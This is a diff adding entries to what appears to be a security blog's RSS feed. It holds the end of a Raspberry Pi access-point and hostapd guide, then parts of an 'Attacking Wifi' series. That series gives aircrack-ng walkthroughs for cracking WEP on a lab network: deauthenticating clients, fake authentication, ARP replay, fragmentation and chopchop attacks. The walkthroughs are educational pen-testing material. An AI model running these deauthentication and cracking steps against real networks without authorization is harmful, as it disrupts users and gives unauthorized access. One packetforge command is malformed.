+&lt;p&gt;Now we will setup IP masquerading for outbound traffic on eth0&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Not, let’s save the new rule:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo sh -c &quot;iptables-save &amp;gt; /etc/iptables.ipv4.nat&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Next, we set the rule to load on boot, by adding the following line to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/rc.local&lt;/code&gt; file just above the line: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exit 0&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;iptables-restore &amp;lt; /etc/iptables.ipv4.nat
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We are almost finished configuring the Pi as a fully functional access point.  The last task is adding a bridge to pass all the traffic between the wlan0 and eth0 interfaces.&lt;/p&gt;
+
+&lt;p&gt;We will need to install another packet to achieve this:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt-get install bridge-utils
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Add the new bridge&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo brctl addbr br0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let’s add our eth0 interface to the bridge&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo brctl addif br0 eth0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And now we just need to edit the interfaces file to add the bridge&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nano /etc/network/interfaces
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, add the following lines to the bottom of the file:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;auto br0
+iface br0 inet manual
+bridge_ports eth0 wlan0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Phew, we are done, now we need to reboot and when the Pi comes back up, it should be a working access point.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo reboot
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;hostapd-sample-configurations&quot;&gt;hostapd sample configurations&lt;/h2&gt;
+
+&lt;p&gt;The following examples are overly simplistic and the minimal needed for running hostapd.  There are quite a few possibly settings the can be added and should be added to the configuration if you are doing anything more than setting up a Wifi pen testing lab.&lt;/p&gt;
+
+&lt;h3 id=&quot;wep-open-authentication&quot;&gt;WEP Open Authentication&lt;/h3&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;interface=wlan0
+driver=nl80211
+bridge=br0
+hw_mode=g
+channel=&amp;lt;channel&amp;gt;
+wmm_enabled=0
+macaddr_acl=0
+ignore_broadcast_ssid=0
+auth_algs=2
+ssid=&amp;lt;network&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;wep-pre-shared-key-authentication&quot;&gt;WEP Pre-Shared Key Authentication&lt;/h3&gt;
+
+&lt;p&gt;The key length should be 5, 13, or 16 characters, or 10, 26, or 32 digits, depending on whether 40-bit (64-bit), 104-bit (128-bit), or 128-bit (152-bit) WEP is used&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;interface=wlan0
+driver=nl80211
+bridge=br0
+hw_mode=g
+channel=&amp;lt;channel&amp;gt;
+wmm_enabled=0
+macaddr_acl=0
+ignore_broadcast_ssid=0
+auth_algs=2
+wep_default_key=0
+wep_key0=&amp;lt;key&amp;gt;
+ssid=&amp;lt;network&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;wpa-psk&quot;&gt;WPA-PSK&lt;/h3&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;interface=wlan0
+driver=nl80211
+bridge=br0
+hw_mode=g
+channel=&amp;lt;channel&amp;gt;
+wmm_enabled=0
+macaddr_acl=0
+ignore_broadcast_ssid=0
+auth_algs=1
+ssid=&amp;lt;network&amp;gt;
+wpa=1
+wpa_key_mgmt=WPA-PSK
+wpa_passphrase=&amp;lt;password&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;wpa2-psk&quot;&gt;WPA2-PSK&lt;/h3&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;interface=wlan0
+driver=nl80211
+bridge=br0
+hw_mode=g
+channel=&amp;lt;channel&amp;gt;
+wmm_enabled=0
+macaddr_acl=0
+ignore_broadcast_ssid=0
+auth_algs=1
+ssid=&amp;lt;network&amp;gt;
+wpa=2
+wpa_key_mgmt=WPA-PSK
+rsn_pairwise=CCMP
+wpa_passphrase=&amp;lt;password&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;wpa2-enterprise&quot;&gt;WPA2 Enterprise&lt;/h3&gt;
+
+&lt;p&gt;Here is a configuration that uses hostapd’s internal RADIUS server, though it is possible to use FreeRADIUS as well.&lt;/p&gt;
+
+&lt;p&gt;/etc/hostapd.conf&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;interface=wlan0
+ctrl_interface=/var/run/hostapd
+ctrl_interface_group=wheel
+ssid=&amp;lt;network&amp;gt;
+wpa=2
+wpa_key_mgmt=WPA-EAP
+wpa_pairwise=TKIP CCMP
+macaddr_acl=0
+auth_algs=1
+own_ip_addr=127.0.0.1
+ieee8021x=1
+eap_server=1
+eapol_version=1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Add the path for the EAP server user database to the end of the file&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;eap_user_file=/etc/hostapd_eap_user
+ca_cert=/etc/ssl/&amp;lt;ca cert&amp;gt;
+server_cert=/etc/ssl/&amp;lt;ssl cert&amp;gt;
+private_key=/etc/ssl/&amp;lt;private key&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;/etc/hostapd_eap_user&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;jesse@domain.tld&quot; PEAP [ver=0]
+&quot;jesse@domain.tld&quot; MSCHAPV2 &quot;&amp;lt;passphrase&amp;gt;&quot; [2]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To make things more secure, you could just use this one line to require a client certificate&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;jesse@domain.tld&quot; TLS
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+</description>
+        <pubDate>Thu, 30 Apr 2020 00:00:00 -0700</pubDate>
+        <link>http://localhost:4000/raspberry%20pi/hostapd/wireless/2020/04/30/setting-up-wifi-ap-rpi/</link>
+        <guid isPermaLink="true">http://localhost:4000/raspberry%20pi/hostapd/wireless/2020/04/30/setting-up-wifi-ap-rpi/</guid>
+      </item>
+    
+      <item>
+        <title>Attacking Wifi Series, Part 5&lt;br /&gt;Bypassing WEP Shared Key Authentication</title>
+        <description>&lt;p&gt;Up to this point, our attacks have been focused on WEP access points that were configured with open authentication.&lt;/p&gt;
+
+&lt;p&gt;Now, we will focus on a WEP access point using a shared key for authentication.&lt;/p&gt;
+
+&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
+
+&lt;p&gt;Unlike open authentication, shared key authentication requires more than just knowledge of the SSID, the same secret key must by known by the client and access point.&lt;/p&gt;
+
+&lt;p&gt;For this scenario, we will be using the information below to illustrate how to conduct the attack and attain the WEP key.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Target Information&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;BSSID&lt;/strong&gt;: 34:08:04:09:3D:38&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;AP Channel&lt;/strong&gt;: 3&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;ESSID&lt;/strong&gt;: hitme (Shared Key Authentication)&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Client&lt;/strong&gt;: 00:18:4D:1D:A8:1F&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;mon0&lt;/strong&gt;: 00:1F:33:F3:51:13&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;initial-attack-setup&quot;&gt;Initial Attack Setup&lt;/h3&gt;
+
+&lt;p&gt;The first step in every attack scenario is to place the wireless interface in &lt;a href=&quot;https://lesperance.io/attacking-wifi-commands#monitor-mode&quot;&gt;monitor mode&lt;/a&gt; on the same channel as the access point.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;airmon-ng start wlan0 3&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This will set &lt;strong&gt;wlan0&lt;/strong&gt; into monitor mode as &lt;strong&gt;mon0&lt;/strong&gt; on channel 3&lt;/p&gt;
+
+&lt;h3 id=&quot;recon&quot;&gt;Recon&lt;/h3&gt;
+
+&lt;p&gt;Now, an &lt;a href=&quot;https://lesperance.io/attacking-wifi-commands#scanning-networks&quot;&gt;Airodump sniffing session&lt;/a&gt; needs to be started and write the capture file to the disk for usage by Aircrack-ng for breaking the WEP key&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;airodump-ng -c 3 –bssid 34:08:04:09:3D:38 -w wep1 mon0&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This will start airodump-ng, listening on Channel 3 and filtering on the BSSID and saving the output to &lt;em&gt;wep1&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Despite have shared key authentication configured on the access point, the AUTH column in airodump will not display SKA until a wireless client authenticates to the network.&lt;/p&gt;
+
+&lt;h3 id=&quot;authenticate&quot;&gt;Authenticate&lt;/h3&gt;
+
+&lt;p&gt;Since the AUTH column is blank, we conduct a &lt;a href=&quot;https://lesperance.io/attacking-wifi-commands#fake-authentication&quot;&gt;fake authentication attack&lt;/a&gt; in order to be able to communicate with the AP.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;aireplay-ng -1 0 -e hitme -b 34:08:04:09:3D:38 -h 00:1F:33:F3:51:13 mon0&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;If the output from the fake authentication attack specifies &lt;em&gt;AP rejects open-system authentication&lt;/em&gt;, we know that the access point is configured for share key authentication.&lt;/p&gt;
+
+&lt;p&gt;We need to acquire a PRGA XOR file before we can conduct a successful fake authentication attack on the access point.  This file is acquired what a client connects to the network, which in a real world network environment can take a while to capture.  You really have 2 options when it comes to this:
+1 Be patient and wait for a client to connect, this is you only option if there are no currently connected clients on the network
+2 Run a deauthentication attack on one of the connected clients to force the client to reassociate to the network, allowing us to capture the shared key authentication handshake.&lt;/p&gt;
+
+&lt;p&gt;After successfully completing the capture of the handshake, airodump with now show SKA in the AUTH column for the access point&lt;/p&gt;
+
+&lt;h3 id=&quot;deauthentication-attack&quot;&gt;Deauthentication Attack&lt;/h3&gt;
+
+&lt;p&gt;Since it is both faster and easy to deauthenticate a client, we will use that route in this scenario.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F mon0&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;After, the client reconnects to the network and airodump will display that is has captured the keystream.&lt;/p&gt;
+
+&lt;h3 id=&quot;shared-key-fake-authentication-attack&quot;&gt;Shared Key Fake Authentication Attack&lt;/h3&gt;
+
+&lt;p&gt;Now that we have the PRGA XOR file for the network, we can now conduct the shared key fake authentication attack, which is largely the same as the normal fake authentication attack.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;aireplay-ng -1 0 -e hitme -y wep1-34-08-04-09-3D-38.xor -a 34:08:04:09:3D:38 -h 00:1F:33:F3:51:13 mon0&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The output from the attack should show that is was successful, which we can verify by checking that airodump shows our mac address as being associated with the access point.&lt;/p&gt;
+
+&lt;h3 id=&quot;arp-request-replay-attack&quot;&gt;ARP Request Replay Attack&lt;/h3&gt;
+
+&lt;p&gt;Now that we have gotten past the hurdle of shared key authentication on the access point, we can attack the access point as we did in the &lt;a href=&quot;https://lesperance.io/hacking-wep-connected-clients&quot;&gt;Hacking WEP With Connected Clients&lt;/a&gt; scenario.  In this case, we will use the ARP request replay attack due to its extreme reliability.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;aireplay-ng -3 -b 34:08:04:09:3D:38 -h 00:1F:33:F3:51:13 mon0&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Now, aireplay is waiting for an ARP packet to appear on the network.&lt;/p&gt;
+
+&lt;h3 id=&quot;deauthentication-attack-1&quot;&gt;Deauthentication Attack&lt;/h3&gt;
+
+&lt;p&gt;We can expedite this process by deauthenticating a connected wireless client.  Upon reconnection, it is highly likely the client will send an ARP packet.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F mon0&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Watching our ARP request replay attack, as soon as the client reconnects to the network, it catches an ARP packet and injects it into the network.&lt;/p&gt;
+
+&lt;p&gt;Checking back to airodump, we can see that IVs are being captured at the rate of a couple hundred per second&lt;/p&gt;
+
+&lt;h3 id=&quot;crack-the-wep-key&quot;&gt;Crack the WEP Key&lt;/h3&gt;
+
+&lt;p&gt;Now that we have captured around 30,000 IVs, we just need to run aircrack-ng against our running capture.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;aircrack-ng wep1.cap&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Now we should be presented with the WEP key.  If however, aircrack was unable to successfully crack the key, with leaving both the airodump capture running along with aircrack, aircrack will reattempt to crack the key every 5000 new IVs captured.&lt;/p&gt;
+</description>
+        <pubDate>Mon, 27 Apr 2020 00:00:00 -0700</pubDate>
+        <link>http://localhost:4000/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/04/27/bypassing-wep-shared-key-authentication/</link>
+        <guid isPermaLink="true">http://localhost:4000/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/04/27/bypassing-wep-shared-key-authentication/</guid>
+      </item>
+    
+      <item>
+        <title>Attacking Wifi Series, Part 4&lt;br /&gt; Hacking Clientess WEP Networks</title>
+        <description>&lt;p&gt;In the last couple of posts, we have covered hacking WEP networks that have connected clients.  What happens if there are no connected clients on the wireless network to help generate our ARP request?  There are 2 attack methods that are usable in this scenario, KoreK chopchop and the fragmentation attack.&lt;/p&gt;
+
+&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
+
+&lt;p&gt;There are times where you will find yourself in a place where the WEP wireless network you are pentesting/hacking has no connected clients.  This limits our ability to generate ARP packets on the network.  However, there are 2 attacks in the aircrack-ng arsenal that can help us in this situation, KoreK chopchop and the fragmentation attack.&lt;/p&gt;
+
+&lt;p&gt;For this scenario, we will be using the information below to illustrate how to conduct the attack and attain the WEP key.  There are several different methods of executing this attack.  I am only showing one of them here.  I may cover the others in a different post.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Target Information&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;BSSID&lt;/strong&gt;: 34:08:04:09:3D:38&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;AP Channel&lt;/strong&gt;: 3&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;ESSID&lt;/strong&gt;: hitme (Open Authentication)&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Client&lt;/strong&gt;: 00:18:4D:1D:A8:1F&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;mon0&lt;/strong&gt;: 00:1F:33:F3:51:13&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;initial-attack-setup&quot;&gt;Initial Attack Setup&lt;/h3&gt;
+
+&lt;p&gt;The first step in every attack scenario is to place the wireless interface in &lt;a href=&quot;https://lesperance.io/attacking-wifi-commands#monitor-mode&quot;&gt;monitor mode&lt;/a&gt; on the same channel as the access point.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;airmon-ng start wlan0 3&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This will set &lt;strong&gt;wlan0&lt;/strong&gt; into monitor mode as &lt;strong&gt;mon0&lt;/strong&gt; on channel 3&lt;/p&gt;
+
+&lt;h3 id=&quot;recon&quot;&gt;Recon&lt;/h3&gt;
+
+&lt;p&gt;Now, an &lt;a href=&quot;https://lesperance.io/attacking-wifi-commands#scanning-networks&quot;&gt;Airodump sniffing session&lt;/a&gt; needs to be started and write the capture file to the disk for usage by Aircrack-ng for breaking the WEP key&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;airodump-ng -c 3 –bssid 34:08:04:09:3D:38 -w wep1 mon0&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This will start airodump-ng, listening on Channel 3 and filtering on the BSSID and saving the output to &lt;em&gt;wep1&lt;/em&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;authenticate&quot;&gt;Authenticate&lt;/h3&gt;
+
+&lt;p&gt;We conduct a &lt;a href=&quot;https://lesperance.io/attacking-wifi-commands#fake-authentication&quot;&gt;fake authentication attack&lt;/a&gt; in order to be able to communicate with the AP.  Unlike in the previous posts, we will set a reassociation timer so that is doesn’t time out&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;aireplay-ng -1 6000 -e hitme -b 34:08:04:09:3D:38 -h 00:1F:33:F3:51:13 mon0&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This allows us to associate with the access point and keeps our session alive.&lt;/p&gt;
+
+&lt;h3 id=&quot;fragmentation-attack&quot;&gt;Fragmentation Attack&lt;/h3&gt;
+
+&lt;p&gt;The first of the 2 methods of attack we will be using is the &lt;a href=&quot;https://lesperance.io/attacking-wifi-commands#fragmentation-attack&quot;&gt;Fragmentation Attack&lt;/a&gt;.  I have personally had more success using this method than I have with using the KoreK chopchop attack.&lt;/p&gt;
+
+&lt;p&gt;The Fragmentation Attack will help us attain the PRGA file.  While this file is not the WEP key, it can be used to craft a packet that can be used in various injection attacks.  The Fragmentation Attack requires at least one data packet to be received from the AP before an attack can be initiated.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;aireplay-ng -5 -b 34:08:04:09:3D:38 -h 00:1F:33:F3:51:13 mon0&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Once the attack is launched, Aireplay starts to listen for a packet that can be used and when it finds a candidate, you will be prompted about using the packet in the attack.&lt;/p&gt;
+
+&lt;h3 id=&quot;crafting-a-packet-with-the-prga&quot;&gt;Crafting a Packet with the PRGA&lt;/h3&gt;
+
+&lt;p&gt;Now that we have the PRGA file for the network, we can use packetforge-ng to craft an ARP Request Packet.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# **packetforge-ng -0 -a 34:08:04:09:3D:38 -h 00:1F:33:F3:51:13 -k 255.255.255.255 -l 255.255.255.255 -y crafted-packet -w&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;One note on selecting the source and destination IP addresses, many APs will respond properly if you use 255.255.255.255 for both.&lt;/p&gt;
+
+&lt;h3 id=&quot;korek-chopchop-attack&quot;&gt;KoreK ChopChop Attack&lt;/h3&gt;
+
+&lt;p&gt;Now, let’s look at the KoreK ChopChop Attack.  When successful, it can decrypt WEP data packets without knowing the WEP key.  Additionally, it can even work against dynamic WEP.&lt;/p&gt;
+
+&lt;p&gt;Not all APs are vulnerable to the KoreK ChopChop Attack.  Some APs will drop packets shorter the 60 bytes.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;aireplay-ng -4 -b 34:08:04:09:3D:38 -h 00:1F:33:F3:51:13 mon0&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Similar to the Fragmentation Attack, after launching the chopchop attack, you will be prompted to select the packet for the attack.  Additionally, the keystream will be saved into a XOR file that can be used to create a packet with packetforge-ng, using the packetforge command above.&lt;/p&gt;
+
+&lt;h3 id=&quot;interactive-packet-replay&quot;&gt;Interactive Packet Replay&lt;/h3&gt;
+
+&lt;p&gt;Now we can take our ARP request packet that we crafted and inject it into the network with the Interactive Packet Replay to generate the IVs needed for cracking the WEP key.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;aireplay-ng -2 -r crafted-packet mon0&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;When prompted to use the crafted packet, enter &lt;strong&gt;y&lt;/strong&gt; to start the injection.&lt;/p&gt;
+
+&lt;p&gt;If you check airodump, you should see the number of packets between your client and the AP should be constantly increasing.&lt;/p&gt;
+
+&lt;h3 id=&quot;crack-the-wep-key&quot;&gt;Crack the WEP Key&lt;/h3&gt;
+
+&lt;p&gt;Now, we just need to run aircrack-ng against our running capture.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;aircrack-ng wep1.cap&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Now we should be presented with the WEP key.&lt;/p&gt;
+</description>
+        <pubDate>Sat, 25 Apr 2020 00:00:00 -0700</pubDate>
+        <link>http://localhost:4000/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/04/25/hacking-clientless-wep/</link>
+        <guid isPermaLink="true">http://localhost:4000/attacking%20wifi/hacking/pen%20testing/wireless/aircrack-ng/wep/2020/04/25/hacking-clientless-wep/</guid>
+      </item>
+    
+      <item>
+        <title>Attacking Wifi Series, Part 3&lt;br /&gt; Hacking WEP via a Client</title>
+        <description>&lt;p&gt;In this post we will discuss how to attack a client to force it to generate new IVs rather than the access point.&lt;/p&gt;
+
+&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
+
+&lt;p&gt;While it is true that most of the time, hacking a WEP network is accomplished by attacking the access point by generating a packet, that then would be replayed in an effort to get the access point to generate new packets with new IVs.&lt;/p&gt;
+
+&lt;p&gt;However, there are some reasons for attacking the client instead of the AP.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Some access points max out at 130,000 unique IVs&lt;/li&gt;
+  &lt;li&gt;Some access points enforce client-to-client controls&lt;/li&gt;
+  &lt;li&gt;MAC Address whitelisting/restrictions&lt;/li&gt;
+  &lt;li&gt;Some newer access points can eliminate weak IVs&lt;/li&gt;
+  &lt;li&gt;You are unable to successfully fake auth the access point&lt;/li&gt;
+  &lt;li&gt;You are out of range for the access point, but are in range of a client&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;For this scenario, we will be using the information below to illustrate how to conduct the attack and attain the WEP key.  There are several different methods of executing this attack.  We are only showing one of those methods here, though, we may cover the other methods in a later post.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Target Information&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;BSSID&lt;/strong&gt;: 34:08:04:09:3D:38&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;AP Channel&lt;/strong&gt;: 3&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;ESSID&lt;/strong&gt;: hitme (Open Authentication)&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Client&lt;/strong&gt;: 00:18:4D:1D:A8:1F&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;mon0&lt;/strong&gt;: 00:1F:33:F3:51:13&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;initial-attack-setup&quot;&gt;Initial Attack Setup&lt;/h3&gt;
+
+&lt;p&gt;The first step in every attack scenario is to place the wireless interface in &lt;a href=&quot;https://lesperance.io/attacking-wifi-commands#monitor-mode&quot;&gt;monitor mode&lt;/a&gt; on the same channel as the access point.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;airmon-ng start wlan0 3&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This will set &lt;strong&gt;wlan0&lt;/strong&gt; into monitor mode as &lt;strong&gt;mon0&lt;/strong&gt; on channel 3&lt;/p&gt;
+
+&lt;h3 id=&quot;recon&quot;&gt;Recon&lt;/h3&gt;
+
+&lt;p&gt;Now, an &lt;a href=&quot;https://lesperance.io/attacking-wifi-commands#scanning-networks&quot;&gt;Airodump sniffing session&lt;/a&gt; needs to be started and write the capture file to the disk for usage by Aircrack-ng for breaking the WEP key&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root@attacker:~# &lt;strong&gt;airodump-ng -c 3 –bssid 34:08:04:09:3D:38 -w wep1 mon0&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This will start airodump-ng, listening on Channel 3 and filtering on the BSSID and saving the output to &lt;em&gt;wep1&lt;/em&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;authenticate&quot;&gt;Authenticate&lt;/h3&gt;
+
+&lt;p&gt;Now, while is isn’t required for this attack, we will conduct a fake authentication attack against the AP for 2 reasons.  First, always a good practice to conduct a fake authetication attack against a WEP AP.  Second, having you MAC associated with the access point can make this attack more reliable.&lt;/p&gt;
+
+&lt;p&gt;We conduct a &lt;a href=&quot;https://lesperance.io/attacking-wifi-commands#fake-authentication&quot;&gt;fake authentication attack&lt;/a&gt; against the AP&lt;/p&gt;
+
